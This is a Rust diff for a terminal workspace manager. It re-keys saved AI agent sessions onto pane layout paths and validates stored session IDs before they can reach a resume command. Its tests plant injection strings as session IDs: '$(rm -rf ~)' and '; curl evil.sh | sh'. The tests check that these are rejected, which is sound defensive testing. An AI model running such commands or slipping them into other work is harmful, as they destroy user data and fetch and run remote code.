@@ -201,6 +201,25 @@ pub(crate) fn validate_workspace_data(
             let hook_ids: std::collections::HashSet<&str> =
                 project.hook_terminals.keys().map(|s| s.as_str()).collect();
             if let Some(ref mut layout) = project.layout {
+                // Agent sessions are keyed by terminal id — exactly what is
+                // about to be dropped. Re-key them onto their pane's layout
+                // path so `spawn_uninitialized_terminals` can hand each one to
+                // the pane that inherits it. Normalize first: the pass further
+                // down re-runs it (it is idempotent) and it can shift paths, so
+                // capturing beforehand would record stale ones.
+                layout.normalize();
+                let mut pending = HashMap::new();
+                for (terminal_id, session) in &project.agent_sessions {
+                    // A hook terminal keeps its id, so its session stays keyed
+                    // by that id and needs no re-keying.
+                    if hook_ids.contains(terminal_id.as_str()) || !session.is_valid() {
+                        continue;
+                    }
+                    if let Some(path) = layout.find_terminal_path(terminal_id) {
+                        pending.insert(path, session.clone());
+                    }
+                }
+                project.pending_agent_resumes = pending;
                 layout.clear_terminal_ids_except(&hook_ids);
             }
             project.service_terminals.clear();
@@ -235,6 +254,13 @@ pub(crate) fn validate_workspace_data(
         project
             .hidden_terminals
             .retain(|id, _| layout_ids.contains(id));
+        // Same rule for agent sessions, plus a re-validation pass: workspace.json
+        // is user-editable and long-lived, so a stored `session_id` must clear
+        // the same UUID invariant the OSC parser enforces before it can reach a
+        // resume command.
+        project
+            .agent_sessions
+            .retain(|id, session| layout_ids.contains(id) && session.is_valid());
     }
 
     // Populate worktree_ids from worktree_info back-references (migration for old data)
@@ -1163,6 +1189,7 @@ pub fn default_workspace() -> WorkspaceData {
             connection_id: None,
             service_terminals: HashMap::new(),
             agent_sessions: HashMap::new(),
+            pending_agent_resumes: HashMap::new(),
             default_shell: None,
             hook_terminals: HashMap::new(),
             pinned: false,
@@ -1588,6 +1615,7 @@ mod tests {
             connection_id: None,
             service_terminals: HashMap::new(),
             agent_sessions: HashMap::new(),
+            pending_agent_resumes: HashMap::new(),
             default_shell: None,
             hook_terminals: HashMap::new(),
             pinned: false,
@@ -1690,6 +1718,122 @@ mod tests {
             _ => panic!("Expected terminal"),
         }
         assert!(data.projects[0].service_terminals.is_empty());
+    }
+
+    fn agent_session(session_id: &str) -> okena_core::agent_session::AgentSession {
+        okena_core::agent_session::AgentSession {
+            agent: "claude-code".to_string(),
+            session_id: session_id.to_string(),
+            transcript_path: None,
+        }
+    }
+
+    const UUID_A: &str = "3b9c1f2a-4d5e-6f70-8a9b-0c1d2e3f4a5b";
+    const UUID_B: &str = "11111111-2222-3333-4444-555555555555";
+
+    /// A split with two panes, ids `tid0` / `tid1` at paths `[0]` / `[1]`.
+    fn split_project(id: &str) -> ProjectData {
+        use crate::state::SplitDirection;
+        let mut project = make_project(id);
+        project.layout = Some(LayoutNode::Split {
+            direction: SplitDirection::Horizontal,
+            sizes: vec![50.0, 50.0],
+            children: vec![
+                LayoutNode::Terminal {
+                    terminal_id: Some("tid0".to_string()),
+                    minimized: false,
+                    detached: false,
+                    shell_type: okena_terminal::shell_config::ShellType::Default,
+                    zoom_level: 1.0,
+                },
+                LayoutNode::Terminal {
+                    terminal_id: Some("tid1".to_string()),
+                    minimized: false,
+                    detached: false,
+                    shell_type: okena_terminal::shell_config::ShellType::Default,
+                    zoom_level: 1.0,
+                },
+            ],
+        });
+        project
+    }
+
+    #[test]
+    fn validate_rekeys_agent_sessions_onto_layout_paths() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session(UUID_A));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        validate_workspace_data(&mut data, true, SessionBackend::None);
+
+        let project = &data.projects[0];
+        // The id the session was keyed by is gone, so it must have moved onto
+        // the pane's path — otherwise the restored pane can never resume it.
+        assert!(project.agent_sessions.is_empty());
+        assert_eq!(
+            project.pending_agent_resumes.get(&vec![1]),
+            Some(&agent_session(UUID_A))
+        );
+        assert_eq!(project.pending_agent_resumes.len(), 1);
+    }
+
+    #[test]
+    fn validate_keeps_agent_sessions_when_ids_survive() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session(UUID_A));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        // A session backend keeps terminal ids, so the pane re-attaches to a
+        // live agent — nothing to re-key and nothing to resume.
+        validate_workspace_data(&mut data, false, SessionBackend::None);
+
+        let project = &data.projects[0];
+        assert_eq!(
+            project.agent_sessions.get("tid1"),
+            Some(&agent_session(UUID_A))
+        );
+        assert!(project.pending_agent_resumes.is_empty());
+    }
+
+    #[test]
+    fn validate_drops_orphaned_and_tampered_agent_sessions() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session(UUID_B));
+        // A pane that no longer exists in the layout.
+        project
+            .agent_sessions
+            .insert("ghost".to_string(), agent_session(UUID_A));
+        // A hand-edited workspace.json smuggling a command in as a session id.
+        project
+            .agent_sessions
+            .insert("tid0".to_string(), agent_session("$(rm -rf ~)"));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        validate_workspace_data(&mut data, false, SessionBackend::None);
+
+        let project = &data.projects[0];
+        assert_eq!(project.agent_sessions.len(), 1);
+        assert!(project.agent_sessions.contains_key("tid1"));
+    }
+
+    #[test]
+    fn validate_does_not_queue_a_resume_for_a_tampered_session() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session("; curl evil.sh | sh"));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        validate_workspace_data(&mut data, true, SessionBackend::None);
+
+        assert!(data.projects[0].pending_agent_resumes.is_empty());
+        assert!(data.projects[0].agent_sessions.is_empty());
     }
 
     #[test]
